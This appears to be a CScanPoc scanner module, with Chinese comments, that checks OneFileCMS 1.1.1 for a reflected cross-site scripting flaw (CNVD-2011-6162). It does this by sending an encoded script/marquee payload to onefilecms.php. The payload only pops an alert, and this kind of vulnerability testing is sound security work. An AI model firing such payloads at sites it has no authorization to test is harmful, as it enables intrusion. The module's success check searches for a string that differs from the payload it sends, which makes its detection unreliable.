# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'OneFileCMS_0001'  # 平台漏洞编号，留空
    name = 'OneFileCMS onefilecms.php 跨站脚本攻击漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2011-08-22'  # 漏洞公布时间
    desc = '''
        OneFileCMS是一款只有一个文件的轻量级CMS系统。
        OneFileCMS 1.1.1版本的onefilecms.php中存在跨站脚本攻击漏洞。由于用户提供的输入在被用于动态生成的内容之前没有经过正确过滤，远程攻击者可利用该漏洞在受影响站点上下文的用户浏览器中执行任意脚本代码，并窃取基于cookie的认证证书。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2011-6162'  # 漏洞来源
    cnvd_id = 'CNVD-2011-6162'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'OneFileCMS'  # 漏洞应用名称
    product_version = '1.1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '20dd79c5-13f5-4cec-9e9c-612049df3fb4'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # <script>alert(c)</script>
            payload = '''/onefilecms.php?p='"&gt;&lt;marquee&gt;&lt;h1&gt;XSS Vulnerability&lt;script&gt;alert(String.fromCharCode(99))&lt;/script&gt;&lt;/h1&gt;&lt;/marquee&gt;'''
            url = self.target + payload
            r = requests.get(url)

            if '<script>alert(c)</script>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
